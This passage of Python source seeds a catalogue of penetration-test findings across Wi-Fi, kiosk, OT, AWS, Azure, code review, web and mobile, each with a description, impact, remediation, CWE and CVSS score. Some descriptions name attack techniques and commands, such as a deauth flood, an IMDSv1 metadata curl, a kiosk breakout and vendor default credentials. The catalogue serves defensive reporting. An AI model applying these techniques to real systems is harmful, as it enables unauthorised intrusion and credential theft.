        _f("wifi_pt", "WPA2-PSK with weak / dictionary passphrase", "High",
            description="A WPA2 4-way handshake was captured and the PSK cracked offline using a 12 GB rockyou+ wordlist in under an hour.",
            impact="Full Layer-2 access to the wireless network and any device that trusts that segment.",
            remediation="- Move to WPA3-SAE where the client estate allows.\n- Otherwise use a 20+ character random passphrase rotated yearly.\n- Segment Wi-Fi off from the production network with strict firewalling.",
            cwe="CWE-521",
            cvss_score=8.1),

        _f("wifi_pt", "Rogue / evil-twin AP not detected", "Medium",
            description="A rogue AP broadcasting the corporate SSID with no security was advertised for an hour and laptops auto-connected without warning.",
            impact="A network-positioned attacker can intercept all DNS, captive-portal, and unencrypted traffic from victims.",
            remediation="- Deploy a WIPS that monitors for unknown BSSIDs advertising managed SSIDs.\n- Configure clients to require server-cert validation on EAP networks.",
            cwe="CWE-300",
            cvss_score=6.5),

        _f("wifi_pt", "WPS PIN exposed (Pixie-Dust)", "High",
            description="The AP has WPS enabled with PIN authentication. Reaver / `pixiewps` recovered the PIN in seconds.",
            impact="Anyone in radio range gains the WPA passphrase.",
            remediation="Disable WPS entirely on every access point. Pre-share the passphrase out-of-band.",
            cwe="CWE-200",
            cvss_score=8.1),

        _f("wifi_pt", "EAP server certificate not validated by clients", "High",
            description="EAP-PEAP clients are configured to trust any server certificate. Hostapd-wpe with a self-signed cert harvests MSCHAPv2 challenge/response pairs.",
            impact="Domain credential theft via captured MSCHAPv2 hashes, which crack offline trivially.",
            remediation="Push a Group Policy that pins the EAP server cert (or its CA) and disables \"don't ask user to authorise new servers\".",
            cwe="CWE-295",
            cvss_score=8.1),

        _f("wifi_pt", "Management frames not protected (no 802.11w)", "Medium",
            description="`aireplay-ng --deauth` flooded the BSSID with deauth frames; affected clients dropped immediately.",
            impact="Denial of service and pre-cursor for forced re-authentication / handshake capture.",
            remediation="Enable 802.11w (PMF) — require it on WPA3 networks; mark it optional on WPA2 transitions.",
            cwe="CWE-770",
            cvss_score=5.3),

        _f("wifi_pt", "Open / WEP guest network", "High",
            description="The guest SSID is open (no authentication) and is bridged to the same VLAN as parts of the corporate network.",
            impact="Anyone within range has unauthenticated access to internal systems.",
            remediation="- Authenticate guests (captive portal with vouchers, or WPA2 with rotating passphrase).\n- Isolate guest traffic on its own VLAN that egresses only to the Internet.",
            cwe="CWE-284",
            cvss_score=8.1),
    ])

    # ------------------------------------------------------------
    # Kiosk PT
    # ------------------------------------------------------------
    F.extend([
        _f("kiosk_pt", "Keyboard shortcut breakout", "High",
            description="`Ctrl+P` opens a print dialog whose file browser allows navigation to `C:\\Windows\\System32\\` and launching `cmd.exe`.",
            impact="Full breakout from the kiosk shell to a standard Windows desktop with the kiosk user's privileges (often local admin).",
            remediation="- Use Windows Assigned Access / Kiosk Mode.\n- Block every shortcut via Group Policy and remove the print / save dialog where it isn't required.\n- Replace File Explorer with a custom shell.",
            cwe="CWE-693",
            cvss_score=8.1),

        _f("kiosk_pt", "Right-click / context menu enabled", "Medium",
            description="Right-clicking inside the kiosk browser exposes \"View source\", \"Inspect element\", and \"Save link as\" menus.",
            impact="Attacker can inspect the application, save arbitrary files to disk, and pivot to OS resources.",
            remediation="Disable the context menu through the embedded browser's configuration (`--disable-features=ContextMenu`, kiosk-specific Edge / Chrome flags).",
            cwe="CWE-693",
            cvss_score=5.3),

        _f("kiosk_pt", "USB auto-run / arbitrary device class enabled", "High",
            description="Inserting a USB drive triggered AutoRun execution of `setup.exe`. The device class for keyboards is not restricted, so a Rubber-Ducky payload executed too.",
            impact="Trivial code execution from any passer-by holding a USB device.",
            remediation="- Disable AutoRun / AutoPlay system-wide.\n- Use Device Control (Defender for Endpoint, GPO) to allow only the keyboards / touchscreens you ship with the kiosk.",
            cwe="CWE-1188",
            cvss_score=8.0),

        _f("kiosk_pt", "Browser navigation to file:// or about:", "High",
            description="Pasting `file:///C:/` (or `about:cache`) into the URL bar exposes the local file system or browser cache.",
            impact="Disclosure of local files, configuration, stored credentials, and browser cache including session cookies.",
            remediation="Restrict navigation to a fixed allow-list of HTTPS hosts; rewrite all other URLs to the kiosk home page.",
            cwe="CWE-22",
            cvss_score=7.5),

        _f("kiosk_pt", "Idle / lock-screen bypass via Sticky Keys", "Medium",
            description="Pressing Shift 5 times on the lock screen launches `sethc.exe`, which opens a UI that can be abused.",
            impact="Local privilege misuse before authentication.",
            remediation="Remove or replace Sticky Keys; disable accessibility shortcuts on the lock screen.",
            cwe="CWE-552",
            cvss_score=5.3, extra_templates=["infra_vapt"]),
    ])

    # ------------------------------------------------------------
    # OT VAPT
    # ------------------------------------------------------------
    F.extend([
        _f("ot_vapt", "Unauthenticated Modbus / TCP 502 access", "Critical",
            description="The PLC at 10.20.0.5 responds to Modbus function-code `06` (write single register) from any source IP with no authentication.",
            impact="Direct manipulation of physical process — opening valves, stopping motors, falsifying sensor readings.",
            remediation="- Segment OT from IT through a one-way diode or strict firewall.\n- Enable Modbus over TLS (where the PLC supports it) or proxy through an authenticated gateway.\n- Place every Modbus endpoint behind an allow-listed IP source.",
            cwe="CWE-306",
            cvss_score=9.4),

        _f("ot_vapt", "HMI workstation on the same VLAN as the corporate network", "High",
            description="The HMI laptop sits in VLAN 10 along with general staff workstations. From any office host an attacker can reach the engineering workstation and the PLC.",
            impact="Pivot from corporate IT to OT in one hop; full process control follows.",
            remediation="Implement Purdue-style segmentation: Level 3 OT DMZ, with no direct routing from corporate VLANs to the control LAN.",
            cwe="CWE-1188",
            cvss_score=8.4),

        _f("ot_vapt", "Default vendor credentials on engineering software", "Critical",
            description="The Siemens TIA Portal / Schneider EcoStruxure web portal accepted vendor defaults (`Administrator / 12345678`).",
            impact="Full upload / download / start / stop authority over the connected PLCs.",
            remediation="Change all default credentials at commissioning; enforce a strong password policy and MFA where the vendor supports it.",
            cwe="CWE-1392",
            cvss_score=9.8),

        _f("ot_vapt", "Unencrypted / unauthenticated DNP3", "High",
            description="DNP3 over TCP/20000 transmits all traffic in plaintext with no authentication of integrity-critical commands.",
            impact="Eavesdropping and command injection on the SCADA channel.",
            remediation="Adopt DNP3 Secure Authentication (SAv5) or tunnel DNP3 over IPsec / TLS.",
            cwe="CWE-319",
            cvss_score=8.6),

        _f("ot_vapt", "Wi-Fi access to the OT VLAN", "High",
            description="A maintenance access point bridges directly into the OT subnet using an unauthenticated SSID.",
            impact="Drive-by access to control-system endpoints.",
            remediation="- Remove the AP entirely if possible.\n- Otherwise require WPA3-Enterprise + cert pinning, with a strict ACL to a small set of engineering laptops.",
            cwe="CWE-284",
            cvss_score=8.1, extra_templates=["wifi_pt"]),
    ])

    # ------------------------------------------------------------
    # AWS Cloud VAPT
    # ------------------------------------------------------------
    F.extend([
        _f("aws_cloud_vapt", "Publicly readable S3 bucket", "High",
            description="The bucket `acme-backups` returns a `200 OK` for `aws s3 ls --no-sign-request s3://acme-backups`. It contains nightly DB dumps.",
            impact="Mass data exfiltration without authentication.",
            remediation="- Set `Block Public Access` on the bucket and on the account.\n- Remove `AllUsers` / `AuthenticatedUsers` ACLs and review bucket policies.\n- Enable S3 access logging and GuardDuty.",
            cwe="CWE-200",
            cvss_score=8.6),

        _f("aws_cloud_vapt", "IMDSv1 enabled on EC2 instances", "Medium",
            description="EC2 instances respond to IMDSv1 (`curl http://169.254.169.254/latest/meta-data/`). An SSRF in any application running on the host yields IAM credentials.",
            impact="SSRF -> instance-role takeover; lateral movement across AWS resources the role can reach.",
            remediation="Enforce IMDSv2 only (`HttpTokens=required`). Also lower the hop limit to 1 to prevent containerised workloads from reaching IMDS.",
            cwe="CWE-918",
            cvss_score=6.4, extra_templates=["web_vapt", "api_vapt"]),

        _f("aws_cloud_vapt", "IAM role with `*:*` policy attached", "Critical",
            description="The `EngineerRole` role has `arn:aws:iam::aws:policy/AdministratorAccess` attached. The role is assumable by 47 IAM users.",
            impact="Any one of those users (or any compromised credential) has full account control.",
            remediation="- Apply least-privilege scoped policies per role.\n- Require MFA in the role's trust policy for human users.\n- Move long-lived access keys to IAM Identity Center.",
            cwe="CWE-269",
            cvss_score=9.1),

        _f("aws_cloud_vapt", "Long-lived IAM access keys (>90 days)", "Medium",
            description="Multiple IAM users have access keys older than one year.",
            impact="The blast radius of any historic credential leak (laptop loss, repo commit, ServiceDesk ticket) grows monotonically over time.",
            remediation="- Rotate keys quarterly.\n- Replace static keys with IAM Identity Center / SSO + STS-issued temporary credentials.\n- Add an SCP that denies `iam:CreateAccessKey` outside an approved workflow.",
            cwe="CWE-798",
            cvss_score=5.4),

        _f("aws_cloud_vapt", "CloudTrail disabled / not multi-region", "Medium",
            description="CloudTrail is enabled in `us-east-1` only. Activity in other regions is not recorded.",
            impact="Attacker activity in non-monitored regions is invisible; forensic timeline post-incident is incomplete.",
            remediation="Enable a multi-region CloudTrail with log file validation and store logs in a dedicated audit account.",
            cwe="CWE-778",
            cvss_score=5.3),

        _f("aws_cloud_vapt", "RDS instance publicly accessible", "High",
            description="An RDS PostgreSQL instance has `PubliclyAccessible=true` and a security group permitting 0.0.0.0/0:5432.",
            impact="Brute-force surface on database credentials; one weak password = full data exposure.",
            remediation="- Set `PubliclyAccessible=false`.\n- Restrict the security group to private subnets or VPC peering.\n- Enable IAM database authentication.",
            cwe="CWE-200",
            cvss_score=8.2),
    ])

    # ------------------------------------------------------------
    # Azure Cloud VAPT
    # ------------------------------------------------------------
    F.extend([
        _f("azure_cloud_vapt", "Storage account anonymous access enabled", "High",
            description="`Allow Blob anonymous access` is enabled and the container `customer-docs` is anonymously listable.",
            impact="Unauthenticated read of every blob in the container.",
            remediation="- Disable anonymous access at the storage-account level.\n- Audit containers for `BlobContainerPublicAccessType` other than `None`.\n- Use Defender for Storage to alert on anomalous reads.",
            cwe="CWE-200",
            cvss_score=8.6),

        _f("azure_cloud_vapt", "Conditional Access bypass via legacy auth", "High",
            description="`Conditional Access` blocks unmanaged devices for modern auth but legacy auth (IMAP, POP, SMTP-AUTH) is not blocked, providing a bypass route.",
            impact="Account compromise via password-spray against legacy endpoints, evading the policy.",
            remediation="- Block legacy auth tenant-wide (`Block legacy authentication` Conditional Access policy).\n- Disable basic auth in Exchange Online.",
            cwe="CWE-287",
            cvss_score=7.5),

        _f("azure_cloud_vapt", "User has `Global Administrator` without PIM", "High",
            description="Several user accounts hold permanent Global Administrator role assignments rather than just-in-time via Privileged Identity Management.",
            impact="Standing privilege increases the impact of any credential compromise; full tenant takeover follows from a single compromised account.",
            remediation="Move all privileged roles to PIM with eligible assignments, MFA-on-activation, and an approval workflow.",
            cwe="CWE-269",
            cvss_score=7.4),

        _f("azure_cloud_vapt", "Managed Identity overprivileged", "Medium",
            description="An App Service's system-assigned managed identity has `Storage Blob Data Owner` on the entire subscription's storage accounts when it needs read on one container.",
            impact="A successful SSRF or RCE in the App Service yields full data plane authority across many storage accounts.",
            remediation="Apply RBAC scoped to the specific container / resource. Re-grant `Storage Blob Data Reader` at the container level.",
            cwe="CWE-272",
            cvss_score=6.5, extra_templates=["aws_cloud_vapt"]),

        _f("azure_cloud_vapt", "NSG with 0.0.0.0/0 on SSH/RDP", "High",
            description="Multiple Network Security Groups have `Any:22` or `Any:3389` allow rules.",
            impact="Direct Internet-facing brute force surface on every VM behind those NSGs.",
            remediation="- Restrict source IP ranges to a corporate jump host or Azure Bastion.\n- Use Just-In-Time access from Defender for Cloud.",
            cwe="CWE-284",
            cvss_score=7.3),

        _f("azure_cloud_vapt", "Key Vault soft-delete / purge protection disabled", "Medium",
            description="Several Key Vaults lack purge protection. Soft-deleted keys / secrets can be permanently removed by an attacker holding `Microsoft.KeyVault/locations/deletedVaults/purge/action`.",
            impact="Denial of service via destruction of cryptographic material; potential ransomware accelerant.",
            remediation="Enable soft-delete and purge protection on every Key Vault; restrict the `purge` action via RBAC.",
            cwe="CWE-693",
            cvss_score=5.4),
    ])

    # ------------------------------------------------------------
    # Source Code Review
    # ------------------------------------------------------------
    F.extend([
        _f("source_code_review", "Hardcoded secrets in repository history", "High",
            description="`git log -p` surfaces multiple commits containing API keys, OAuth client secrets, and SMTP passwords.",
            impact="Any clone of the repository (CI cache, fork, departed developer's laptop) carries the secret forever.",
            remediation="- Rotate every leaked secret immediately.\n- Rewrite history with BFG or `git filter-repo`; force-push (with team coordination).\n- Add a pre-commit hook + CI step (gitleaks / trufflehog).",
            cwe="CWE-798",
            cvss_score=7.5, extra_templates=["mobile_pt", "thick_client_pt"]),

        _f("source_code_review", "Use of weak hash (MD5 / SHA1) for password storage", "Critical",
            description="`UserService.hashPassword` uses `MessageDigest.getInstance(\"MD5\")` without salting or stretching.",
            impact="Stolen password hashes are trivial to crack (billions of guesses per second on commodity GPUs).",
            remediation="Use Argon2id (preferred) or bcrypt with cost ≥ 12. Migrate existing hashes on next successful login.",
            cwe="CWE-916",
            cvss_score=9.1),

        _f("source_code_review", "Use of `eval()` on user input", "High",
            description="`api/util.py` calls `eval(request.args['expr'])` to compute simple arithmetic.",
            impact="Trivial remote code execution on the server.",
            remediation="Replace with `ast.literal_eval` or a sandboxed math parser. Better: don't accept executable expressions from clients.",
            cwe="CWE-95",
            cvss_score=9.8, extra_templates=["web_vapt", "api_vapt"]),

        _f("source_code_review", "Insecure deserialization (pickle / Java serialization)", "High",
            description="`pickle.loads(request.cookies['session'])` reads a session cookie with `pickle` deserialisation.",
            impact="An attacker crafts a malicious pickle and achieves RCE the moment the server processes it.",
            remediation="Use signed JSON tokens (or a vetted format like CBOR) for session payloads. Never deserialise untrusted pickle / Java serialised data.",
            cwe="CWE-502",
            cvss_score=9.0, extra_templates=["web_vapt", "api_vapt"]),

        _f("source_code_review", "Predictable random in security-sensitive context", "Medium",
            description="`secret_token = random.randint(...)` is used for password-reset tokens.",
            impact="`random` is seeded with system time and is not cryptographic; an attacker can predict tokens.",
            remediation="Use `secrets.token_urlsafe(32)` / `os.urandom`. Treat `random` as test-only.",
            cwe="CWE-330",
            cvss_score=6.8),

        _f("source_code_review", "Dependency with known CVE", "Medium",
            description="`requirements.txt` pins `requests==2.6.0`, which has multiple published CVEs since 2015.",
            impact="The application inherits every public vulnerability in the pinned version.",
            remediation="- Adopt automated dependency-update tooling (Renovate / Dependabot).\n- Track SCA findings in CI and fail builds above a severity threshold.",
            cwe="CWE-1104",
            cvss_score=5.5),

        _f("source_code_review", "Logging of sensitive request headers", "Low",
            description="A Django middleware logs `request.META` including `HTTP_AUTHORIZATION` to disk on every error.",
            impact="Bearer tokens leak into log aggregation systems and are available to anyone with log access.",
            remediation="Redact sensitive headers (`Authorization`, `Cookie`, `X-API-Key`) before logging.",
            cwe="CWE-532",
            cvss_score=3.7),
    ])

    # ============================================================
    # 2026-05 catalogue extensions — common findings the team asked
    # for but that the original seed didn't cover. Every entry has a
    # CWE so it surfaces in the exported Excel tracker's CWE column
    # without manual entry.
    # ============================================================

    # ---- Web / API / Mobile additions -------------------------------
    F.extend([
        _f("web_vapt", "HTTP Request Smuggling", "High",
            description="A discrepancy between how the front-end proxy and the back-end server parse `Content-Length` / `Transfer-Encoding` headers allows an attacker to smuggle a second request inside the body of the first one (CL.TE / TE.CL / TE.TE desync).\n\nProof of concept: sending a crafted request with both `Content-Length` and `Transfer-Encoding: chunked` causes the back-end to treat trailing bytes as a new pipelined request whose target / method the attacker controls.",
            impact="Attackers can poison the request queue of subsequent legitimate users — hijacking authenticated sessions, bypassing front-end security controls (WAF / auth), and reaching internal endpoints intended to be unreachable from the Internet.",
            remediation="- Front-end and back-end MUST agree on how to parse `Transfer-Encoding` and `Content-Length`. Where possible, reject any request that contains BOTH.\n- Disable HTTP/1.1 keep-alive between proxy and origin, OR upgrade both ends to HTTP/2 end-to-end.\n- Patch / upgrade reverse proxies and origin servers to versions that explicitly defend against TE.CL / CL.TE confusion.",
            references="https://portswigger.net/web-security/request-smuggling\nhttps://cwe.mitre.org/data/definitions/444.html",
            cwe="CWE-444", owasp="A05:2021",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Insecure Transport: HTTPS Downgrade / Cleartext HTTP Allowed", "Medium",
            description="The application serves the same content over plain `http://` (no automatic redirect to HTTPS) AND does not emit a `Strict-Transport-Security` (HSTS) header. As a result, an attacker on the network path can force users onto the HTTP endpoint via SSL-strip / MitM and observe / modify the traffic.\n\nFurther observed: TLSv1.0 / TLSv1.1 are still negotiable when HTTPS IS used.",
            impact="Credentials, session cookies, and any PII transmitted by users on the affected hosts can be intercepted in cleartext by anyone on the network path (open Wi-Fi, malicious ISP, compromised intermediate proxy).",
            remediation="- Redirect every HTTP request to HTTPS (301).\n- Emit `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` on every HTTPS response and submit the domain to the HSTS preload list.\n- Disable TLSv1.0 / TLSv1.1; require TLSv1.2 minimum, prefer TLSv1.3.\n- Restrict cipher suites to AEAD (AES-GCM / ChaCha20-Poly1305).",
            references="https://owasp.org/www-project-cheat-sheets/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\nhttps://cwe.mitre.org/data/definitions/319.html",
            cwe="CWE-319", owasp="A02:2021",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["api_vapt", "infra_vapt", "infra_va"]),

        _f("web_vapt", "Verbose Errors Disclosed in HTTP Response", "Low",
            description="Application responses for malformed input return verbose stack traces, framework names + versions, internal file paths, and SQL / ORM error messages. Sample: `/api/orders?id='` returns a 500 with `psycopg2.errors.SyntaxError: at or near \"'\"` and the source file `app/services/orders.py:142`.",
            impact="An attacker learns the application's tech stack, framework version, file layout, and SQL dialect — accelerating subsequent vulnerability discovery (e.g. selecting the right SQLi payload).",
            remediation="- Run the application with `DEBUG=false` in production.\n- Render a generic error page; log full traces server-side only.\n- Hide framework banners (`Server:` header, `X-Powered-By:` etc.).",
            references="https://owasp.org/www-community/Improper_Error_Handling",
            cwe="CWE-209", owasp="A09:2021",
            cvss_score=3.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt"]),

        _f("web_vapt", "Bypass of Client-Side Protection", "Medium",
            description="Client-side controls (JavaScript validation, disabled form fields, hidden UI elements, max-length attributes) are the ONLY thing preventing crafted requests from being submitted. Disabling JavaScript or sending the request directly via curl / Burp accepts the input and the server returns 200 OK.\n\nExample: file-type / file-size validation is enforced only by the upload widget. Sending an arbitrary `.exe` directly to `/api/upload` with `Content-Type: image/png` succeeds and the file is stored.",
            impact="Attackers can manipulate requests, bypass business logic, escalate privileges, or perform actions that the UI nominally prevents. Severity scales with what the server-side accepts — file uploads, role changes, and price tampering are common consequences.",
            remediation="- Mirror every client-side validation rule on the server. Treat client-side checks as UX only, never as a security boundary.\n- Reject requests whose values, types, sizes, or formats fall outside the documented contract.\n- Add integration tests that hit endpoints directly (no browser) with invalid inputs.",
            references="https://owasp.org/www-community/vulnerabilities/Client-Side_Enforcement_of_Server-Side_Security",
            cwe="CWE-602", owasp="A04:2021",
            cvss_score=5.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt"]),

        _f("web_vapt", "User Input Reflected in HTTP Response (Informational)", "Informational",
            description="User-supplied values are echoed back into the HTTP response body. The reflected context (HTML body, attribute, JavaScript, JSON) and the encoding applied determine whether this becomes an XSS vulnerability — at observation time, the value is correctly encoded and no script execution was achieved.\n\nExample: `/search?q=<safe>` returns `<p>You searched for: &lt;safe&gt;</p>` (HTML-encoded; safe today).",
            impact="By itself, reflection without execution is not exploitable. It's logged as an informational finding because a future code change that drops or weakens the encoding would convert this same input into a Cross-Site Scripting vulnerability. Treat reflected sinks as candidates for ongoing regression testing.",
            remediation="- Continue to apply contextual output encoding at the reflection sink.\n- Add a regression test that asserts the reflected character set stays encoded.\n- Where possible, avoid reflecting unfiltered input at all.",
            references="https://owasp.org/www-community/attacks/xss/",
            cwe="CWE-79", owasp="A03:2021",
            cvss_score=0.0,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt"]),

        _f("web_vapt", "Sensitive Data / PII Disclosed in Application Logs", "Medium",
            description="Application logs capture full request bodies, query strings, response payloads, or stack traces that contain sensitive data — passwords, session tokens, NRIC / national IDs, full card numbers, OTP codes, or PII (email, phone, address).\n\nObserved at `/var/log/app/access.log` where POST bodies including `password=…` and `otp=…` are written in plaintext for every authentication request.",
            impact="Anyone with read access to the log files or the centralised logging system (engineers, SREs, SaaS log vendors, anyone who exfiltrates a backup) sees credentials and PII they don't need. This commonly drives breach-notification obligations under PDPA / GDPR even when the rest of the application was secure.",
            remediation="- Redact known-sensitive fields (`password`, `otp`, `token`, `nric`, card numbers) BEFORE the value reaches the logger. Apply at the framework's logging middleware so it's centralised.\n- Mask PII using deterministic redaction (`john.doe@xxx.com` → `j***.d***@***`) when the value must remain partially diagnostic.\n- Restrict log access to a need-to-know role; audit reads.\n- Set short log-retention windows for raw request bodies; keep only aggregates long-term.",
            references="https://cwe.mitre.org/data/definitions/532.html\nhttps://owasp.org/www-project-cheat-sheets/cheatsheets/Logging_Cheat_Sheet.html",
            cwe="CWE-532", owasp="A09:2021",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt", "source_code_review", "infra_vapt"]),
    ])

    # ---- Mobile-specific addition ------------------------------------
    F.extend([
        _f("mobile_pt", "Sensitive Data Exposed via App-Switcher Snapshot", "Low",
            description="When the application is sent to the background (Home button, recent-apps switcher, lock screen) the operating system captures a screenshot of the foreground view and uses it as the app-switcher thumbnail. The captured frame includes sensitive on-screen content — account balances, full card numbers, OTP codes, internal documents.\n\niOS: cached at `Library/Caches/Snapshots/<bundle id>/`.\nAndroid: held in memory and surfaced in the recent-apps list / overview.",
            impact="Anyone with physical access to an unlocked device — or to a device backup (iCloud, iTunes, ADB) — can view the cached snapshot and recover the sensitive data that was on screen at the moment the user switched away.",
            remediation="- **iOS**: in `applicationWillResignActive` overlay the window with a blank / blurred view or the app's launch screen before the snapshot is taken. Reset on `applicationDidBecomeActive`.\n- **Android**: set `WindowManager.LayoutParams.FLAG_SECURE` on every Activity that displays sensitive data — the OS will not capture a thumbnail at all and screen-recording is blocked.\n- Clear sensitive in-memory state during `onPause` / `applicationWillResignActive` where feasible.",
            references="https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0073/\nhttps://developer.android.com/training/permissions/requesting#flag_secure",
            cwe="CWE-200", owasp="M9: Insecure Data Storage",
            cvss_score=3.9,
            cvss_vector="CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- AWS Cloud VAPT (from the cloud-tracker screenshot) ----------
    F.extend([
        _f("aws_cloud_vapt", "Managed Policy Allows iam:PassRole For All Resources", "High",
            description="A customer-managed or AWS-managed policy grants `iam:PassRole` on `Resource: \"*\"`, meaning principals with the policy can pass ANY existing IAM role to AWS services (EC2 launch, Lambda creation, ECS task definition, etc.).",
            impact="An attacker who compromises any principal with this policy can pivot to ANY role in the account — including roles with administrator-level permissions — by launching a workload that assumes that role.",
            remediation="- Replace `Resource: \"*\"` with the explicit ARNs of the roles the principal legitimately needs to pass.\n- Combine with an `iam:PassedToService` condition key to lock down WHICH AWS service the role can be passed to.\n- Audit IAM Access Analyzer findings for `iam:PassRole` misuse.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_actions-resources-contextkeys.html\nhttps://cwe.mitre.org/data/definitions/269.html",
            cwe="CWE-269",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["azure_cloud_vapt"]),

        _f("aws_cloud_vapt", "Inline IAM Policy Allows sts:AssumeRole For All Resources", "High",
            description="An inline IAM policy attached to a role / user grants `sts:AssumeRole` on `Resource: \"*\"`, allowing the principal to assume any role they can name (including cross-account roles whose trust policies permit them).",
            impact="Any principal with this policy can escalate privileges by assuming higher-privileged roles in the same account, in trusted partner accounts, or — when paired with overly permissive role-trust policies — in attacker-controlled accounts.",
            remediation="- Restrict the `Resource` list to the explicit role ARNs the principal needs to assume.\n- Inline policies are harder to audit than managed ones; convert to a customer-managed policy and apply IAM Access Analyzer.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html",
            cwe="CWE-269",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("aws_cloud_vapt", "Managed IAM Policy Allows sts:AssumeRole For All Resources", "High",
            description="A customer-managed policy attached to one or more principals grants `sts:AssumeRole` on `Resource: \"*\"`. The blast radius extends to every principal that has the managed policy attached.",
            impact="Privilege escalation across the entire account (and into any account whose role-trust policies permit the principal). Anyone able to write to the managed policy can quietly grant cross-account access.",
            remediation="- Replace `Resource: \"*\"` with explicit role ARNs.\n- Constrain who can edit the managed policy via SCPs and least-privilege admin roles.\n- Enable CloudTrail alerts on `PutRolePolicy` / `AttachRolePolicy` for high-privilege policies.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
            cwe="CWE-269",
            cvss_score=7.5),

        _f("aws_cloud_vapt", "Root Account Without Hardware MFA", "High",
            description="The AWS root user account is not protected by a hardware MFA device (only virtual / software MFA — or no MFA at all). Hardware MFA was a CIS / GovTech ICT-RMM benchmark requirement for the root user since 2017.",
            impact="The root user has unlimited privileges including the ability to close the account, alter billing, and override SCPs. A successful phish or SIM-swap on a software-MFA-protected root account compromises the entire AWS footprint.",
            remediation="- Issue a hardware MFA token (YubiKey, Gemalto) to the root user.\n- Store the credentials offline; rotate access keys to ZERO for the root user.\n- Use IAM identities for all day-to-day operations; reserve root for break-glass.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_mfa_enable_physical.html\nhttps://cwe.mitre.org/data/definitions/308.html",
            cwe="CWE-308",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("aws_cloud_vapt", "Root Account Without MFA", "Critical",
            description="The AWS root user account has NO MFA configured. The account is protected by the password alone.",
            impact="A single phishing or password-reuse event grants attackers full administrative access to every resource in the account — data exfiltration, resource destruction, billing escalation, account closure.",
            remediation="- Enable MFA on the root user IMMEDIATELY. Prefer a hardware token; software MFA is a stop-gap.\n- Rotate the root password to a strong random string stored offline.\n- Set up an alarm on `ConsoleLogin` events for the root user.",
            references="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html",
            cwe="CWE-308",
            cvss_score=9.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"),

        _f("aws_cloud_vapt", "Network ACL Allows All Ingress / Egress Traffic", "Medium",
            description="One or more Network ACLs are configured with permissive rules (e.g. `0.0.0.0/0` allow for all protocols on all ports) in both ingress and egress directions. NACLs are the first network-layer control before Security Groups.",
            impact="Eliminates the defence-in-depth value of NACLs. Combined with any overly permissive Security Group, traffic that should be blocked at the subnet boundary reaches the instance.",
            remediation="- Restrict NACL rules to the explicit ports and CIDRs the subnet requires.\n- Layer NACLs UNDERNEATH Security Groups (NACL = subnet-wide deny-by-default; SG = per-instance allow-by-default).\n- Use AWS Config rules `vpc-default-security-group-closed` and `nacl-no-unrestricted-ssh-rdp` to detect regressions.",
            references="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html",
            cwe="CWE-732",
            cvss_score=5.4),

        _f("aws_cloud_vapt", "EBS Encryption By Default Is Disabled", "Medium",
            description="Account-level setting `EBS Encryption by Default` is OFF in one or more regions. New EBS volumes created without an explicit `Encrypted: true` flag are stored unencrypted.",
            impact="Sensitive data on EBS volumes — application databases, container snapshots, log volumes — sits unencrypted at rest. Snapshot copies (which can be shared cross-account) carry the cleartext data.",
            remediation="- Enable `EBS Encryption by Default` in every region the account uses (`aws ec2 enable-ebs-encryption-by-default --region <r>`).\n- Specify a customer-managed KMS key so key access can be audited and rotated independently.\n- Audit existing unencrypted volumes (`aws ec2 describe-volumes --filters Name=encrypted,Values=false`) and rotate them via snapshot → encrypted copy.",
            references="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html",
            cwe="CWE-311",
            cvss_score=5.0),

        _f("aws_cloud_vapt", "S3 Bucket Without MFA Delete", "Medium",
            description="One or more S3 buckets holding sensitive / regulated data have versioning enabled but `MFA Delete` disabled. Without MFA Delete, anyone with `s3:DeleteObject` or `s3:DeleteBucket` permissions can permanently remove versions.",
            impact="Risk of accidental or malicious deletion of audit logs, financial records, evidence stores, and other write-once data. Defeats the durability guarantees that versioning is supposed to provide.",
            remediation="- Enable MFA Delete on every bucket holding regulated / write-once data (requires the root user to enable, via `aws s3api put-bucket-versioning --mfa <serial+code>`).\n- Where MFA Delete is not feasible, configure Object Lock in Compliance mode.\n- Restrict `s3:Delete*` via SCPs to a narrow break-glass role.",
